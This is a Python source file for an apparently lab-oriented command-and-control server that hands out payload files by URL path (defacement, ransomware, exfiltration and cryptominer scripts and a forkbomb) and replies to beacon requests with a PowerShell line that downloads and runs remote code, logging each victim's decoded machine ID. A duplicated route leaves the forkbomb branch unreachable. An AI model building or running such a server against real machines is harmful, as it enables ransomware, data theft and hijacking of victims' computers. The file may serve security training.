import os
from http.server import SimpleHTTPRequestHandler, HTTPServer
from datetime import datetime
# import humanhash
import base64


def log_transaction(data):
    file = open("log.txt", 'a')
    file.write(data)
    file.close()


class CustomHandler(SimpleHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/shrek_wallpaper':
            # Defacement
            self.serve_file('../defacement/shrek_wallpaper.ps1')
            return
        if self.path == '/awesomeware':
            # Ransomware
            self.serve_file('../ransomware/ransom.ps1')
            return
        if self.path == '/ratata':
            # Exfiltration
            self.serve_file('../exfil/squeak.ps1')
            return
        if self.path == '/cryptobro':
            # Cryptominer
            self.serve_file('../cryptominer/DummyCryptoMiner.exe')
            return
        if self.path == '/cryptobro':
            # Forkbomb
            self.serve_file('../dos/Forkbomb.exe')
            return
            
        log_data = ''
        # Get the current timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_data += f'[{timestamp}]\n'
        # Log the request with timestamp

        print(f"[{timestamp}] Received GET request for {self.path}")

        # Respond with some content
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

        # Single command sent to C2 Beacon
        response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/ratata" | Invoke-Expression'''
        # response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/ratata" | & ./DummyCryptoMiner.exe'''
        ###########################

        self.wfile.write(response_content.encode('utf-8'))

        # Optionally handle custom headers
        computer_id = self.headers.get('X-Cookie')
        log_data += f'B64 ID: {computer_id}\n'

        if computer_id:
            decoded_bytes = base64.b64decode(computer_id)
            hex_string = decoded_bytes.hex()
            computer_id = hex_string
            # computer_id = humanhash.humanize(hex_string)
            print(f"[{timestamp}] Received computer ID: {computer_id}")
        #log_data += f'Human-Hash ID: {computer_id}\n'
        log_data += f'PC ID: {computer_id}\n'
        log_data += f'Command: {response_content}\n\n'

        log_transaction(log_data)
        return

    def serve_file(self, file_path):
        try:
            # Ensure the file exists
            if os.path.isfile(file_path):
                # Send response status code
                self.send_response(200)

                # Send headers
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
                self.end_headers()

                # Open and read the file
                with open(file_path, 'rb') as file:
                    command = file.read()
                    self.wfile.write(command)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'404 File Not Found')
        except Exception as e:
            # Handle any errors
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'500 Internal Server Error')


def main(server_class=HTTPServer, handler_class=CustomHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()


if __name__ == '__main__':
    main()
